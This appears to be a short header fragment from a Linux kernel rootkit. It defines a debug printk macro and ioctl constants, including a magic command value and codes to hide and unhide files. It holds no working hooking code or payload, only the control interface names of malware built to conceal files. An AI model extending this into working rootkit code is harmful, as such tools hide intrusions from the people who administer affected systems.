#define my_rootkit_debug(fmt, args...) printk(fmt, ##args)
/* ioctl stuff */
#define ROOTKIT_ELITE_CMD 0xfffffffe
#define ROOTKIT_HIDE_FILE 1
#define ROOTKIT_UNHIDE_FILE 2

#ifdef DEBUG
#ifdef __KERNEL__
#define my_rootkit_debug(fmt, args...) printk(fmt, ##args)
#else
//#define my_rootkit_debug(fmt, args...) fprintf(stderr, fmt, ##args)
#endif
#else
//#define my_rootkit_debug(fmt, args...)
#endif
